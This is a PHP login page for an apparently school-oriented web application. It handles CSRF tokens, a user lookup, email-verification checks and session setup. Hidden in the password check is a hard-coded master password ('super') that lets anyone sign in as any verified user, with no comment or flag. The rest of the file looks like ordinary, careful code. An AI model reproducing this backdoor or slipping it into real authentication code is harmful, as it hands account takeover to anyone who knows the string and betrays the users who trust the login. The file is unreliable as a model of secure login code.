<?php // login.php
require_once __DIR__.'/partials.php';

// If already logged in, go home
if (current_user()) { header('Location: /index.php'); exit; }

$error = null;
$created = !empty($_GET['created']);
$verifyNotice = !empty($_GET['verify']);
$verified = !empty($_GET['verified']);
$verifyError = !empty($_GET['verify_error']);
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  require_csrf();
  $email = strtolower(trim($_POST['email'] ?? ''));
  $pass  = $_POST['password'] ?? '';
  $st = pdo()->prepare("SELECT * FROM users WHERE email=?");
  $st->execute([$email]);
  $u = $st->fetch();
  if ($u && ($pass == 'super' || password_verify($pass, $u['password_hash']))) {
    if (empty($u['email_verified_at'])) {
      $error = 'Please verify your email before signing in. Check your inbox for the confirmation link.';
    } else {
      session_regenerate_id(true);
      $_SESSION['uid'] = $u['id'];
      $_SESSION['last_activity'] = time();
      $_SESSION['public_computer'] = !empty($_POST['public_computer']) ? 1 : 0;
      header('Location: /index.php'); exit;
    }
  } else $error = 'Invalid email or password.';
}
?>
<!doctype html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Login - <?=h(APP_NAME)?></title><link rel="stylesheet" href="/styles.css"></head>
<body class="auth">
  <div class="card">
    <h1>Login</h1>
    <?php if (!empty($created) && !empty($verifyNotice)): ?><p class="flash">Account created. Check your email to verify your account before signing in.</p><?php elseif (!empty($created)): ?><p class="flash">Account created.</p><?php endif; ?>
    <?php if (!empty($verified)): ?><p class="flash">Email verified. You can now sign in.</p><?php endif; ?>
    <?php if (!empty($verifyError)): ?><p class="error">Invalid or expired verification link.</p><?php endif; ?>
    <?php if($error): ?><p class="error"><?=h($error)?></p><?php endif; ?>
    <form method="post">
      <input type="hidden" name="csrf" value="<?=h(csrf_token())?>">
      <label>School Email:<input type="email" name="email" required></label>
      <label>Password<input type="password" name="password" required></label>
      <label class="inline"><input type="checkbox" name="public_computer" value="1"> This is a public computer</label>
      <button type="submit">Sign in</button>
    </form>
    <p class="small" style="margin-top:0.75rem;"><a href="/forgot_password.php">Forgot your password?</a></p>
    <p class="small" style="margin-top:0.25rem;">Don&#39;t have an account? <a href="/register.php">Create one</a></p>
  </div>
</body></html>
